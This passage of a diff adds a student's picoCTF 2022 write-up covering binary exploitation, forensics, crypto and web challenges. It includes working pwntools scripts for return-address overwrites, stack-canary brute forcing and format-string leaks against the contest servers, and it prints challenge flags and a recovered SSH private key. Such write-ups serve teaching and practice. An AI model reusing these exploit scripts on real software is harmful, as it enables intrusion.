+        │   0x8049201 <win+11>                      call   0x8049130 <__x86.get_pc_thunk.bx>   │
+        │   0x8049206 <win+16>                      add    $0x2dfa,%ebx                        │
+        │   0x804920c <win+22>                      sub    $0x8,%esp                           │
+        │   0x804920f <win+25>                      lea    -0x1ff8(%ebx),%eax                  │
+        │   0x8049215 <win+31>                      push   %eax                                │
+        │   0x8049216 <win+32>                      lea    -0x1ff6(%ebx),%eax                  │
+        │   0x804921c <win+38>                      push   %eax                                │
+        │   0x804921d <win+39>                      call   0x80490c0 <fopen@plt>               │
+    I figured it was at address 0x80491f6.
+    Once that was done, I figured I would need to figure out how many 
+    characters are needed to actually overflow the buffer and be able to overwrite the return
+    address. I constantly made a small sequence that would be used to output characters
+    to a file, and then after have the ./vuln file take that file as input and then I would
+    need to see if that overflowed the buffer:
+        python3 -c 'print("a"*48)' > attack.txt
+        ./vuln < attack.txt
+    I would figure out when the buffer is overflowed is when there is a segmentation fault.
+    Once the 'attack.txt' reached lengths in the 40s, I needed to pay attention to what the
+    return address message was saying. Instead of the first line in the sequence having just
+    'a'*48 being put into attack.txt, I decided to add 4 b's into the mix, so that they can
+    tell me whether I have reached the sweet spot for the return address. In this case I would
+    reach the sweet spot at 44 a's and 4 b's following, as the return address message had 
+    something like:
+        Okay, time to return... Fingers Crossed... Jumping to 0x62626262
+        zsh: segmentation fault  ./vuln < test.txt
+    The hex value of character 'b' is 62, which shows that I have changed the return address
+    into something different. Now I have to switch the address of the flag function into 
+    either big endian or little endian. I decided to go with little endian, and I changed the
+    first line of the sequence to incorporate the little endian value of the flag return
+    address:
+        # You can do 'p32(0x80491f6)' with pwntools to get the little endian version of the address
+        python -c 'print("a"*44+"\xf6\x91\x04\x08")' > attack.txt
+    Once this was ready, I ran the second part of the sequence to test if the exploit worked. This
+    is what I got:
+        Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
+        Please create 'flag.txt' in this directory with your own debugging flag.
+    This shows I was able to overflow the buffer, change the return address, and run the function
+    that would print out the flag. This of course did not print the flag, as I was not testing this
+    locally. I put the file with the payload into the webshell, connected to the webshell, and ran
+    this command to send the payload to the server to get the flag:
+        cat attack.txt | nc saturn.picoctf.net 57439
+    This time it actually worked, and I was able to get the flag: picoCTF{addr3ss3s_ar3_3asy_b9797671} 
+
+Buffer Overflow2(BE):
+    This is similar to the first buffer overflow, however the main difference is that I now have to 
+    specify arguments as well as the redirection of the return address to get the flag. I originally
+    tried to do this a similar way with the first buffer overflow with building the packet manually
+    with python, however instead I decided to use pwntools. Firstly, I tried to get the amount of A's
+    that it took to overflow the buffer. This number turned out to be about 112 A's(followed by the
+    exploit code) which shows that the script running is vulnerable to the attack. I found this out by 
+    checking the EIP of the script once I used dummy payloads. I used gdb to do so:
+        Starting program: ./vuln < ex.txt
+        Please enter your string: 
+        aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb
+
+        Program received signal SIGSEGV, Segmentation fault.
+        0x62626262 in ?? ()
+    I saw 0x62626262 which are 4 b's, which shows I overwrote the return address and can move on to the
+    next step. Once I was able to get the amount of A's that it took to overflow the buffer and overwrote 
+    the EIP, I then proceeded to find out what the return address of the 'win' function was. I could do 
+    this with ease in pwntools by simply doing:
+        e = ELF('./vuln')
+        addr = e.symbols['win']
+    This gets the return address of the win function. I knew that this was not enough, as according to 
+    the c file, I needed to provide the arguments that are actually going to allow me to pass through 
+    and get the flag. I did some googling and it turns out that I can just join the arguments together
+    with the new return address and get the flag. These arguements will be 0xcafef00d and 0xf00df00d
+    as according to the source code, those are required for the flag to actually display itself. The
+    code snippet for that is here:
+        if (arg1 != 0xCAFEF00D)
+            return;
+        if (arg2 != 0xF00DF00D)
+            return;
+        printf(buf);
+    These arguments are simply hexadecimal values and will be converted into integers, and another way
+    to figure this out is also that the function takes integers as arguments, and there isn't really a 
+    solid way to compare integers with other types(exception of float). This is a script that I created 
+    to run the attack:
+        from pwn import *
+        e = ELF('./vuln')
+        r = remote("saturn.picoctf.net", 51587)
+        addr = e.symbols['win']
+        payload = b''
+        payload += (b'A' * 112) + p64(addr) + p32(0xcafef00d) + p32(0xf00df00d)
+        r.sendline(payload)
+        r.interactive()
+    This allowed me to get the flag: picoCTF{argum3nt5_4_d4yZ_eb489c7a}
+
+Buffer Overflow3(BE):
+    Another Buffer Overflow, this time with protection measures to prevent such attacks from happening.
+    With the use of a static canary, this can easily be brute-forced, as I can know when I have a piece
+    of the canary when there is not an error message that shows up once I go over the character limit. I
+    first actually needed to figure out how many a's it took to actually crash the program, and I kept 
+    going until I saw this error message when I had 65 a's spammed:
+        ***** Stack Smashing Detected ***** : Canary Value Corrupt!
+    The script has detected a buffer overflow and it has stopped. I made a script to brute force this, 
+    so I do not have to manually do it:
+        from pwn import *
+        context.log_level = 'error'
+        canary = ""
+        current_buf = 65
+        def brute_canary(buff: int):
+            for c in range(1,128):
+                p = remote("saturn.picoctf.net",50398)
+                p.sendline(f"{buff}".encode())
+                _p = str("a"*64+canary+chr(c)).encode()
+                p.sendline(_p)
+                msg=p.recvall().decode()
+                if "Ok" in msg:
+                    return chr(c)
+        print("[+] Bruteforcing the canary...This may take time!")
+        for i in range(4):
+            canary += brute_canary(current_buf)
+            current_buf += 1
+        print("[+] Canary:",canary)
+    After a bit of waiting, the script solved what the canary is, which was 'BiRd'. Now it was a matter of
+    actually overflowing, and redirecting the return address to the flag function. I first needed to see what
+    the address actually was, and I used pwntools to get it:
+        from pwn import *
+        e = ELF('./vuln')
+        print(f"{e.symbols['win']:x}")
+        print(p32(e.symbols['win']))
+    This is what I found:
+        8049336 - Hexidecimal value
+        b'6\x93\x04\x08' - Hexidecimal value into little endian
+    This shows that the win function is at address 0x08048336, and can be converted into little endian to execute
+    that in the program. I needed to figure out the offset to overwrite the EIP of the script, and so I decided
+    to bruteforce that and solve it right then and there. This is the script I made to solve it:
+        from pwn import *
+        context.log_level = 'error'
+        canary = ""
+        current_buf = 65
+        port = 50398
+        def brute_canary(buff: int):
+            for c in range(1,128):
+                p = remote("saturn.picoctf.net",port)
+                p.sendline(f"{buff}".encode())
+                _p = str("a"*64+canary+chr(c)).encode()
+                p.sendline(_p)
+                msg=p.recvall().decode()
+                if "Ok" in msg:
+                    return chr(c)
+        print("[+] Bruteforcing the canary...This may take time!")
+        for i in range(4):
+            canary += brute_canary(current_buf)
+            current_buf += 1
+        addr = 0x08049336
+        addr = p32(addr)
+        print("[+] Canary:",canary)
+        for i in range(100):
+            p = remote('saturn.picoctf.net', port)
+            _p = str('a'*64+canary)
+            p.sendline(f"100".encode())
+            print("[+] Sending payload:",_p.encode()+b"a"*i+addr)
+            p.sendline(_p.encode()+b"a"*i+addr)
+            msg = p.recvall().decode()
+            if "picoCTF" in msg:
+                print("[+] We're In.\n")
+                print(msg)
+                break
+    Once I ran the script, I did a little bit of waiting and I solved the problem:
+        [+] We're In.
+        How Many Bytes will You Write Into the Buffer?
+        > Input> Ok... Now Where's the Flag?
+        picoCTF{Stat1C_c4n4r13s_4R3_b4D_78734aff}
+    I successfully bypassed the canary protection and redirected the return address to get the flag.
+
+CVE-XXXX-XXXXX(BE):
+    According to the hint, it looks like I'll have to google this one. I looked up
+    'vulnerability in 2021 in the Windows Print Spooler Service' and got 2021-36958 
+    as the filler numbers, however they seemed to have been incorrect.vI did some 
+    more digging and I found it on this page: 
+        https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527
+    The title of the page already had the flag, and all I had to do was put it into
+    flag format: picoCTF{CVE-2021-34527}
+
+Packets Primer(F): 
+    Once downloading the pcap, I looked at the packets in wireshark to see what they
+    might be saying. There were TCP packets after following the TCP stream of one of
+    the packets(the filter is 'tcp.stream eq 0'). With my somewhat competence with 
+    knowing about the 3-way handshake, I figured that packets with '[PSH, ACK]' will
+    contain data that has been sent from the source. PSH stands for push, which the
+    source pushes the bytes to the destination to the application level, so that it
+    can be used to form a message. This is what I found from that packet:
+        'Îs'¯9EpPÂ@@Ñ³
+
+        ¾n#('ìÔ·½&¼öu
+        ÏéehðñÃp i c o C T F { p 4 c k 3 7 _ 5 h 4 r k _ d 0 5 6 5 9 4 1 }
+    This of course has the flag, what I needed to do was simply remove all of the
+    spaces to get the flag of: picoCTF{p4ck37_5h4rk_d0565941}
+
+Fresh Java(RE): 
+    At first, the Java file was compiled, which means that I would be unable to work with
+    until it is decompiled. I looked up a decompiler(http://www.javadecompilers.com/)
+    and I was able to decompile the class. here is what I found:
+        ...
+        if (nextLine.charAt(3) != 'o') {
+            System.out.println("Invalid key");
+            return;
+        }
+        if (nextLine.charAt(2) != 'c') {
+            System.out.println("Invalid key");
+            return;
+        }
+        if (nextLine.charAt(1) != 'i') {
+            System.out.println("Invalid key");
+            return;
+        }
+        if (nextLine.charAt(0) != 'p') {
+            System.out.println("Invalid key");
+            return;
+        }
+        System.out.println("Valid key");
+    I took a good look at the if statements and they looked to be able to construct the flag
+    if I put all the strings together from the bottom to the top. Using this I constructed 
+    the flag: picoCTF{700l1ng_r3qu1r3d_c2475607}
+
+Local Authority(WE):
+    Going to the website, I entered some incorrect credentials to see what would happen, as
+    there did not seem to be anything that was of interest in the beginning. I noticed a
+    script tag and decided to go to the source of that script, and this is what it had:
+        function checkPassword(username, password)
+        {
+          if( username === 'admin' && password === 'strongPassword098765' )
+          {
+            return true;
+          }
+          else
+          {
+            return false;
+          }
+        }
+    The JavaScript had a normal if statement, which had both the admin and password in
+    plain text. I decided to enter these values into the username and password prompt,
+    and I was able to log in. 
+    The flag was in plain text: picoCTF{j5_15_7r4n5p4r3n7_8086bcb1}
+
+Sleuthkit Intro(F): 
+    I simply ran this in the webshell. I cd'd into '/tmp' and then I ran
+        wget https://artifacts.picoctf.net/c/114/disk.img.gz
+    After doing so, I decompressed the gz file using "gzip -d disk.img.gz" and then
+    used 'mmls' to find the sizes and lengths of the disk image. This is what had
+    popped out:
+        DOS Partition Table
+        Offset Sector: 0
+        Units are in 512-byte sectors
+
+              Slot      Start        End          Length       Description
+        000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
+        001:  -------   0000000000   0000002047   0000002048   Unallocated
+        002:  000:000   0000002048   0000204799   0000202752   Linux (0x83)
+    I used the length of "002" and put it into the netcat connection to then get the flag.
+    After inputting that length, I got the flag: picoCTF{mm15_f7w!}
+
+Sleuthkit Apprentice(F):    
+    After doing some diving in the internet, I figured out how to do this one. I needed to 
+    first get the offsets of the partitions(which were the 'start' in 'mmls'). I used the
+    command 'mmls' to list all of the partitions:
+        DOS Partition Table
+        Offset Sector: 0
+        Units are in 512-byte sectors
+
+              Slot      Start        End          Length       Description
+        000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
+        001:  -------   0000000000   0000002047   0000002048   Unallocated
+        002:  000:000   0000002048   0000206847   0000204800   Linux (0x83)
+        003:  000:001   0000206848   0000360447   0000153600   Linux Swap / Solaris x86 (0x82)
+        004:  000:002   0000360448   0000614399   0000253952   Linux (0x83)
+    I decided to try each of the Linux (0x83) partitions, and I ran these commands:
+        fls -r  -o 2048 disk.flag.img | grep flag
+        fls -r  -o 360448 disk.flag.img | grep flag
+    Only the partition with offset 360448 of them gave me the filenames, and they looked like this:
+        ++ r/r * 2082(realloc):	flag.txt
+        ++ r/r 2371:	flag.uni.txt
+    This was useful, and I used the icat command to find out what what hidden inside of the file:
+        icat disk.flag.img -o 360448 2371
+    After running the command, I was able to get the flag: picoCTF{by73_5urf3r_152f373f}
+
+Flag Leak(BE): 
+    I used a rather unorthodox method to solve this problem. At first I tried to identify
+    the main vulnerability of the C file, to which I figured out that formatting
+    strings are being used. Knowing that they are exploitable to be able to display
+    variables, I did some research detailing C format string exploitation. I looked at
+    the example that was done, and got lost when it went to looking at the stack.
+    I did however notice the format string which looked different('%24$s' as opposed to
+    %s), and I decided to make a program that would brute force the number until I had
+    the flag. This is how it looked like:
+        from pwn import *
+        import string
+        HOST = '' # IP here
+        PORT = 0 # Port here
+        if __name__ == "__main__":
+            r = remote(HOST, PORT)
+            found = False    
+            for i in range(128):
+                try:
+                    print(r.recvuntil("> ").decode(), end="")
+                    payload = f"%{i}$s"
+                    r.sendline(payload.encode())
+                    print(payload)
+                    r.recvline()
+                    val = r.recvline(timeout=2)
+                    try:
+                        val = val.decode()
+                    except:
+                        pass
+                    print(val)
+                    if "CTF" in val:
+                        break
+                except:
+                    # server closes the connection after some time
+                    r = remote(HOST, PORT)
+        print(f"[+] Flag found!: pico{val}")
+    This idea worked, which gave me the flag of: picoCTF{L34k1ng_Fl4g_0ff_St4ck_b840e879}
+    That was when I realised I used the wrong method, but it worked!
+
+Rail Fence(C): 
+    I downloaded the Cipher, and I looked up a tool that could decode the cipher.
+    I set the cipher to the message, and set the rails to 4. I pressed the decrypt
+    option to get a rail like this:
+        T     a           _     7     N     6     D     E     7 
+         h   l g   : W   3 D   _ H   3 C   3 1   N _   _ B   D 4
+          e f     s   H R   0 5   3 F   3 8   N 4   3 D   4 7   
+                 i     3     3     _     _     _     N     C    
+    This simply translates to the message:
+        The flag is: WH3R3_D035_7H3_F3NC3_8361N_4ND_3ND_EB4C7D74
+    Which got me the flag.
+
+Search Source(WE):
+    This was a simple problem, that involved looking at the source code of the 
+    website(http://saturn.picoctf.net:58519/). I for some reason decided to 
+    look everywhere in the sources except for the file 'styles.css', which
+    conveniently had the flag. Once I was told by another participant that
+    the flag was there, I immediately went looking for it, to unsurprisingly
+    find it. It was located on line 328:
+        /** banner_main picoCTF{1nsp3ti0n_0f_w3bpag3s_869d23af} **/
+    This contained the flag that was needed to solve the problem.
+
+File Types(F):
+    This was likely the most painful problem that I had encountered, as it
+    involved many packages needing to be downloaded, as well as some lack
+    of knowledge when it came to decompressing files. In the file that I
+    downloaded, I payed attention to the magic number of the file(this
+    essentially gives the format of the file), so that I could try to use
+    tools to then decompress that file with the correct format. Being a
+    noob in decompressing, I had to ask someone to give me some insight on
+    how to actually use the commands. The first command to run was to
+    unzip a '.ar'(with magic number '!<arch>') file:
+        tar -xf file.ar
+    I realised that the decompressed file was also compressed, so I made
+    the file ending into a '.zip' and then opened it. This brought me
+    up to another compressed file, to which I needed to learn more 
+    commands so that I could decompress them. Eventually it got to a
+    point where there were no magic numbers, so I was told to run the
+    command
+        file filename
+    so that the format of the file can be displayed, and the right tool
+    can be used. I had to install a few new packages just to decompress 
+    the files, and I had to repeat this process for 3-5 times(lost count).
+    After much decompressing, it all came to a text file, that had something
+    like this:
+        7069636f4354467b66316c656e406d335f6d406e3170756c407431306e5f
+        6630725f3062326375723137795f33343765616536357d0a
+    My first thought was that this was hex, and I put it into a hex translator
+    to get the flag of: picoCTF{f1len@m3_m@n1pul@t10n_f0r_0b2cur17y_347eae65}
+
+Diffie-Hellman(C):
+    I had to learn how to do this algorithm, so I googled it and watched a 2-3
+    minute Khan Academy video on how the key exchange works and the use of 
+    private keys to then eventually get the key to do decryption. The hint states
+    that the g = 5, and p = 13. I was also taught the formula to construct the 
+    public keys to exchange with the other person. This is what it was:
+        (g^x) mod p
+    In this case, x is simply the secret key. This goes for both people, and in
+    the end this number will be the same.
+        Operations(Alice, Bob):
+            (5^7) mod 13 = 8
+            (5^3) mod 13 = 8
+    With that in mind, the public keys can then be used to create the key that
+    will be able to change the cipher, and the formula for that is:
+        (k^x) mod p
+    This means that the superkey will then be 5, as using the formula is able to
+    do so. The hint mentions shifting the Cipher backwards or forwards, which means
+    to shift the list of letters and digits to the left or to the right. Since the
+    superkey is 5, this means that the list of letters and digits will shift 5
+    positions to the left or to the right. I decided to go with left, and I made
+    the script to do everything for me:
+        from string import ascii_uppercase, digits
+        ls = list(ascii_uppercase+digits)
+        print("Original Cipher:",ls)
+        item = list("H98A9W_H6UM8W_6A_9_D6C_5ZCI9C8I_7IGK58KC")
+        g = 5
+        p = 13
+        def publicresult(x):
+            return (g**x)%p
+        def get_private_key(x,y):
+            return (x**y)%p
+        def shift(ls,pk):
+            s1 = ls[0:pk]
+            s2 = ls[pk:]
+            s2.extend(s1)
+            return s2
+        a = 7
+        a_p = publicresult(a)
+        b = 3
+        b_p = publicresult(b)
+        pk = get_private_key(b_p,a)
+        print("Key",pk)
+        print("New Cipher:",shift(ls,pk))
+        cipher = shift(ls,pk)
+        string = ""
+        for i in item:
+            found = False
+            for ii in range(len(cipher)):
+                if cipher[ii] == i:
+                    string += ls[ii]
+                    found = True
+            if not found:
+                string += i
+        print("Flag: picoCTF{"+string+"}")
+    After running the script, I was able to decipher everything, and get thus
+    capture the flag: picoCTF{C4354R_C1PH3R_15_4_817_0U7D473D_2DBF03F7}
+
+Side Channel(F):
+    This problems requires the user to do a Side-Channel timeout attack on the
+    binary file, to then get the key that is able to then get the flag. This 
+    information was obtained through the hint, and after watching a short video
+    on time out attacks, I figured out the theory. At least in my thinking, I
+    figured that the number checking was done in nested if statements, and the 
+    more correct characters that one has, means more if statements being used
+    and therefore meaning slightly more computing time. This means that the more
+    correct digits means that authentication will take slightly longer as opposed
+    to getting them wrong. A theorized code for the authentication looks as such:
+        valid = False
+        pw = input("Enter the password: ")
+        if len(pw) == 8:
+            if pw[0] == "p":
+                if pw[1] == "a":
+                    if pw[2] == "s":
+                        if pw[3] == "s":
+                            if pw[4] == "w":
+                                if pw[5] == "o":
+                                    if pw[6] == "r":
+                                        if pw[7] == "d":
+                                            valid = True
+                                            print("Access granted!")
+            if not valid:
+                print("Access denied.")
+        else:
+            print("The password has to be 8 characters!")
+    This is not the actual source, rather a depiction of what I would think the
+    password checking is. With more characters that are correct, means more character
+    checking and more consumed. While the time may seem indistinguishable through the
+    human eye, there are ways to do this with a script. I figured out how to use
+    pwntools to measure the time taken to check a passkey, and would add the number
+    added to the passkey that would take the longest to authenticate. Eventually this
+    would lead to the main passkey being created, allowing the me to get the flag
+    without having to bruteforce numbers one by one in the ten millions. This is what
+    the script I created was:
+        from pwn import *
+        import string
+        import time
+        def get_longest_time(ls: list):
+            current_small = [0,0]
+            for i in ls:
+                if i[1] > current_small[1]:
+                    current_small = i
+            return current_small[0]
+        if __name__ == "__main__":
+            r = process(argv=["./pin_checker"])
+            alphabet = string.digits
+            found = False
+            nums = [0,0,0,0,0,0,0,0]
+            timings = []
+            changeindex = 0
+            found = False
+            nums_check = 0
+            i = 0
+            while not found:
+                try:
+                    while i != 10:
+                        try:
+                            nums[changeindex] = i
+                            nums =nums
+                            _time = time.time()
+                            print(r.recvline().decode())
+                            payload = "".join([str(x) for x in nums])
+                            print(payload)
+                            r.sendline(payload.encode())
+                            r.recvline()
+                            r.recvline()
+                            item = r.recvline().decode()
+                            timing = time.time()-_time
+                            timings.append([i,timing])
+                            if "denied" not in item:
+                                found = True
+                                break
+                            i += 1
+                            r.close()
+                        except Exception as e:
+                            print(e)
+                            r = process(argv=["./pin_checker"])
+                    i = 0
+                    nums_check += 1
+                    smallest = get_longest_time(timings)
+                    nums[changeindex] = smallest
+                    changeindex += 1
+                    if nums_check >= 9:
+                        break
+                except:
+                    r = process(argv=["./pin_checker"])
+            print(f"[+] Flag found!: {item}")
+            print("[+] Use this key:","".join(str(x) for x in nums))
+    The script I created is far from perfect, as it has ugly output, and is likely
+    not fully optimised. I couldn't use for loops because the variable 'i' kept on
+    increasing by 2 instead of 1, which made me have to use a while loop instead.
+    It took me 2 attempts with this script to be able to get the key, and when I
+    had gotten it, my script said this:
+        [+] Starting local process './pin_checker': pid 4073
+        Please enter your 8-digit PIN code:
+
+        48390513
+        [+] Flag found!: Access granted. You may use your PIN to log into the master server.
+    I was able to do a timing attack to quickly get the 8 digit pin, and so I put it into the
+    master server to then get the flag of: picoCTF{t1m1ng_4tt4ck_8d0e5357}
+
+Eavesdrop(F):
+    Using the webshell or a linux system is highly suggested. I was on my MacOS machine and
+    I encountered various problems in the end that could have been avoided in the first place
+    with Linux. When opening the pcap, I decided to look through the TCP packets until I found
+    the conversation that was briefly mentioned in the hint. There I was able to extract the
+    command needed to decrypt the file once obtained:
+        openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123  
+    Looking a bit further down, I was able to see some [TCP,PSH] packets that also showed the
+    actual contents of the file itself(This may not look the same as yours, but it should be
+    similar):
+        Salted__e`X�W�2���A��(VRj�:�{�*<n�B[�W����_`j
+    With this in mind, I opened nano on the webshell and I pasted the contents of the file into
+    it. I ran the command that was supplied to me, and I was able to get the flag: picoCTF{nc_73115_411_445e5629}
+
+Roboto Sans(WE):
+    This was a more painful challenge that I did. The main hint is the title, however it is not
+    exactly Roboto Sans, as the word that you should be paying attention to is 'Robot', which 
+    goes to the 'robots.txt' text file:
+        User-agent *
+        Disallow: /cgi-bin/
+        Think you have seen your flag or want to keep looking.
+
+        ZmxhZzEudHh0;anMvbXlmaW
+        anMvbXlmaWxlLnR4dA==
+        svssshjweuiwl;oiho.bsvdaslejg
+        Disallow: /wp-admin/
+    While this does not look very useful, the strings on the bottom are things that are of much
+    interest; Particularly the encoded string in the middle that looks like base64. Putting it
+    into a small python script to decode the base64 turns it into something like:
+        js/myfile.txt
+    Which is something that should be pasted into the website. Once you go to that page, 
+    it shows the flag in plain text: picoCTF{Who_D03sN7_L1k5_90B0T5_6ac64608}
+
+Bbbbloat(RE):
+    I used an unorthodox method to do this, as although it worked, it was for sure the wrong method.
+    I made a script to have my computer bruteforce the key until it was cracked. This is what it
+    was:
+        import os, threading
+        from urllib.request import Request, urlopen
+        import json
+        solved = False
+        i = 0
+        def check(num):
+            global solved
+            output = os.popen(f'echo "{i}" | ./bbbbloat').read()
+            if "sorry" not in output.lower() and not solved:
+                solved = True
+                print("Flag Number:", num)
+                print(output)
+                headers = {'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
+                data = json.dumps({'content':  f"@everyone Just Brute forced './bbbbloat'. Check it out!```Number: {num}\nOutput: {output}```"})
+                req = Request(url="webhooklink", data=data.encode(), headers=headers)
+                urlopen(req)
+            if num % 1000 == 0:
+                print(f"Checks: {num}")
+        while not solved:
+            i += 1
+            thr = threading.Thread(target=check, args=(i,))
+            thr.start()
+    I had a discord webhook in there so that it could notify me when it was able to crack the key.
+    After a bit of waiting I was able to get a message that had said the key was found, and it
+    even had the flag!:
+        Number: 549255
+        Output: What's my favorite number? picoCTF{cu7_7h3_bl047_33e4341f}
+    I was able to not only find out the script's favorite number, but also the key itself.
+
+St3g0(F):
+    This flag required more internet searching for an actual source that can actually find the
+    hidden message inside of the png file. I learned from the name that stenography typically
+    means that there is a hidden message hidden in image files(can be others though). I went to 
+    https://aperisolve.fr/ to solve the problem, then be able to actually get the flag. I 
+    scrolled down a bit, and did a ctrl+f of "$t3g0" and I was able to find the flag with relative
+    ease: picoCTF{7h3r3_15_n0_5p00n_1b8d71db}
+
+Operation Orchid(F):
+    Using the knowledge obtained from the previous sleuthkit problems, I was ready to go out and do
+    one of the operations. With little success previously, I properly learned how to use both the mmls
+    and the fls commands so that I am able to properly solve the problem. Once I downloaded the disk
+    image, I wanted to figure what the offsets of the partitions were so that I can use fls. I used
+    mmls to find those out and this is what it showed:
+        DOS Partition Table
+        Offset Sector: 0
+        Units are in 512-byte sectors
+
+              Slot      Start        End          Length       Description
+        000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
+        001:  -------   0000000000   0000002047   0000002048   Unallocated
+        002:  000:000   0000002048   0000206847   0000204800   Linux (0x83)
+        003:  000:001   0000206848   0000411647   0000204800   Linux Swap / Solaris x86 (0x82)
+        004:  000:002   0000411648   0000819199   0000407552   Linux (0x83)
+    I was able to figure out the offsets of each of the Linux partitions, and I used the commands of:
+        fls -r -o 2048 disk.flag.img | grep flag
+        fls -r -o 411648 disk.flag.img | grep flag
+    With this, I was able to figure out that the flag is located here:
+        + r/r * 1876(realloc):	flag.txt
+        + r/r 1782:	flag.txt.enc
+    Afterwards, I used the 'icat' command to figure out the contents of the file:
+        icat disk.flag.img -o 411648 1782
+    This spat out something like this:
+        Salted__Æ‘Û3[u:dmﬁ†
+        D-Z{zü+gﬁp…=’NÊ”˘\≈ÍB¬»§7˘ ≥ÀÒÿé$ƒ'%
+    It appears this is encrypted text. At first glance I was stumped because it would mean that I would
+    have to figure out the encryption key and the encryption method for this text which would take a very
+    long time. I then remembered that there may be some sort of .bash_history file what would have a 
+    history of all of the commands that were previously ran. I ran this command:
+        fls -r -o 411648 disk.flag.img | grep history
+    and I was able to get something:
+        + r/r 1875:     .ash_history
+    This is something, so I decided to use icat on it. Here is what I got:
+        touch flag.txt
+        nano flag.txt 
+        apk get nano
+        apk --help
+        apk add nano
+        nano flag.txt 
+        openssl
+        openssl aes256 -salt -in flag.txt -out flag.txt.enc -k unbreakablepassword1234567
+        shred -u flag.txt
+        ls -al
+        halt
+    I saw the command that was used to actually get encrypted the flag, and it appears that the encryption
+    key itself was also in there, making this process infinitely times more quick and I can simply modify the
+    command to decrypt the flag. I ran the command and I got a rather unfortunate looking output:
+        openssl aes256 -d -salt -in flag.txt.enc -out flag.txt -k unbreakablepassword1234567
+        *** WARNING : deprecated key derivation used.
+        Using -iter or -pbkdf2 would be better.
+        bad decrypt
+        140121381599040:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:../crypto/evp/evp_enc.c:583:
+    While this seemed to show that I had the wrong key, I decided to cat the flag file to make sure I really did
+    do it wrong. I was incorrect, as the flag did indeed get decrypted: picoCTF{h4un71ng_p457_c512004e}
+
+Operation Oni(F):
+    With the skills that I was able to learn from the other Sleuthkit challenges(I did Orchid before Oni),
+    it seems like I am ready to actually conquer this problem. First things first, after downloading the
+    disk image, I needed to find out the partition offsets. With mmls I figured out this:
+        DOS Partition Table
+        Offset Sector: 0
+        Units are in 512-byte sectors
+
+              Slot      Start        End          Length       Description
+        000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
+        001:  -------   0000000000   0000002047   0000002048   Unallocated
+        002:  000:000   0000002048   0000206847   0000204800   Linux (0x83)
+        003:  000:001   0000206848   0000471039   0000264192   Linux (0x83)
+    With my knowledge obtained from previous challenges, the partition that stores most of the useful information
+    is in the second partition. I decided to first look for flag files, and there appeared to be nothing. I decided to
+    do more information gathering and I then realised that an SSH connection is required to get the actual flag.
+    I decided to take a different approach and decided to connect to the SSH server so that I can get an idea on
+    encryption type. It said something along the lines of:
+        ECDSA key fingerprint is SHA256:0L/+wJ.....
+    This gave me the idea that the encryption type might be ECDSA, so I decided to look for files on the disk image that
+    had ECDSA private keys. I ran this command 
+        fls -o 206848 -r  disk.img | grep key
+    to get a general idea on the SSH private and public keys that were in the image, and I got:
+        + d/d 33:       keymap
+        ++ d/d 44:      keys
+        +++ r/r 907:    cryptkey.files
+        +++ r/r 922:    keymap.files
+        ++ r/r 554:     save-keymaps
+        ++ r/r 15:      ssh_host_ed25519_key
+        ++ r/r 16:      ssh_host_ed25519_key.pub
+        ++ r/r 17:      ssh_host_ecdsa_key
+        ++ r/r 18:      ssh_host_ecdsa_key.pub
+        ++ r/r 19:      ssh_host_dsa_key
+        ++ r/r 20:      ssh_host_dsa_key.pub
+        ++ r/r 21:      ssh_host_rsa_key
+        ++ r/r 22:      ssh_host_rsa_key.pub
+        +++++ r/r 1050: keywrap.ko
+        +++++++ r/r 1202:  hyperv-keyboard.ko
+        ++++++ r/r 1213: dm-flakey.ko
+        +++++ d/d 2048: key
+        ++++++ r/r 1691: af_key.ko
+        ++++++ r/r 1884: act_tunnel_key.ko
+        +++++ d/d 2066: keys
+        ++++++ d/d 2067: encrypted-keys
+        +++++++ r/r 2068:  encrypted-keys.ko
+        ++ l/l 355:     showkey
+        ++ r/r 2084:    ssh-keygen
+        ++ r/- * 0:     ssh-keyscan
+        ++ r/r 2193:    keytab-lilo
+        ++ r/r 2143:    ssh-keyscan
+        ++ l/l 346:     setkeycodes
+        +++ d/d 787:    keys
+        + r/r 707:      setup-keymap
+    Before I did anymore, I decided to check the previous commands that the disk image has run, so I checked
+    out the bash history again and this is what I got:
+        ssh-keygen -t ed25519
+        ls .ssh/
+        halt
+    It looks like instead the key uses ed25519 encryption, and I decided to get the private key of that. Once
+    I tried the first ssh key with the same encryption method, it didn't seem to work, so I had to dig even deeper.
+    I decided to find files matching the name of ed25519, and I was able to find:
+        -----BEGIN OPENSSH PRIVATE KEY-----
+        b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+        QyNTUxOQAAACBgrXe4bKNhOzkCLWOmk4zDMimW9RVZngX51Y8h3BmKLAAAAJgxpYKDMaWC
+        gwAAAAtzc2gtZWQyNTUxOQAAACBgrXe4bKNhOzkCLWOmk4zDMimW9RVZngX51Y8h3BmKLA
+        AAAECItu0F8DIjWxTp+KeMDvX1lQwYtUvP2SfSVOfMOChxYGCtd7hso2E7OQItY6aTjMMy
+        KZb1FVmeBfnVjyHcGYosAAAADnJvb3RAbG9jYWxob3N0AQIDBAUGBw==
+        -----END OPENSSH PRIVATE KEY-----
+    I put this into a keyfile, and I ran the command provided to log into the server and I was in:
+        Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-1017-aws x86_64)
+
+        * Documentation:  https://help.ubuntu.com
+        * Management:     https://landscape.canonical.com
+        * Support:        https://ubuntu.com/advantage
+
+        This system has been minimized by removing packages and content that are
+        not required on a system that users do not log into.
+
+        To restore this content, you can run the 'unminimize' command.
+
+        The programs included with the Ubuntu system are free software;
+        the exact distribution terms for each program are described in the
+        individual files in /usr/share/doc/*/copyright.
+
+        Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
